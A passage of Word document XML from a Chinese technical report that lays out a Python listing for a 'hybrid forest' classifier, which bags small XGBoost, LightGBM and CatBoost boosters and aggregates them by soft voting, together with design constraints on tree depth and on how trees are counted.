          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164575D0">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E462FEE">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-18　models/hybrid_forest.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（306 行）　M8 混合森林</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69820FA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""混合森林：外层随机森林的 Bagging 骨架，内层基学习器是随机抽取的提升模型。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E4ADCE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43E1EB94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>和随机森林的唯一区别：每个基学习器不再是一棵 CART，而是从 base_pool 里随机抽到的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBE354E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>XGBoost / LightGBM / CatBoost 之一，训练成一个小型提升模型（浅树 + 少轮数），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE18534">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>最后用软投票聚合各类概率。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D2847AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A97C468">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>三个必须守住的约束（写进报告 4.x）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DB4CBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  1. 提升器内部必须是浅树（base_depth 默认 6）。24 层的树几乎能拟合完训练集，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063DB1EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     后续提升轮次没有残差可学，等于退化成"换个库跑单棵 CART"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE5B90B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  2. base_depth 不得超过 max_depth（对应随机森林那 24 层的护栏），越界直接报错，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C64D4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     不要静默截断。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="233EB317">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  3. 树数口径按库分开算，不能一把尺子量三个库：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EDA8ED7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     XGBoost / LightGBM 多分类每轮**每类各长一棵树**（树数 = base_rounds * n_classes）；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B42B5D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     CatBoost MultiClass 每轮只长**一棵树**，叶子是 n_classes 维向量（树数 = base_rounds）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29424684">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">     报成本必须报到树数，按"轮数"报会让 XGB/LGBM 那两路被低估 n_classes 倍。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF5A417">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C97CE4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54E5DC41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249BCEC9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AE5DDFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E8FEF9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68DDCBA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E5CF82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.base import BaseEstimator, ClassifierMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F01253C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.preprocessing import LabelEncoder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59C00DAB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from sklearn.utils.validation import check_is_fitted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="427F7CD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4380C2AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>__all__ = ["HybridForest", "count_trees"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2AF053">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D0DE489">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77B7E285">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _build_booster(kind, rounds, depth, overrides, seed, n_jobs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C258DBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    overrides = dict(overrides or {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2775D88A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if kind == "xgboost":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367D50D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        from xgboost import XGBClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11A46998">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="156B8999">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kw = dict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EF54B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_estimators=rounds,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF2B0F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_depth=depth,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18020734">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            learning_rate=0.1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5392C0CC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            subsample=0.9,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E096121">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            colsample_bytree=1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0852C91B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            tree_method="hist",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E138D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_jobs=n_jobs,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BAB398E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            random_state=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E9CD46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            verbosity=0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78941886">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381F6F9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kw.update(overrides)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6A362C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return XGBClassifier(**kw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A102EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="088EDBCA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if kind == "lightgbm":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E0EBFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        from lightgbm import LGBMClassifier</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2B9B72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71884B23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        kw = dict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF5C450">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_estimators=rounds,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAED821">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_depth=depth,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681F7508">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # LightGBM 是 leaf-wise 生长，只设 max_depth 挡不住叶子数，必须同时压 num_leaves</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A0483D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            num_leaves=2**depth - 1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="339599EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            learning_rate=0.1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7EBA8B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            subsample=0.9,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E60A166">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            subsample_freq=1,</w:t>
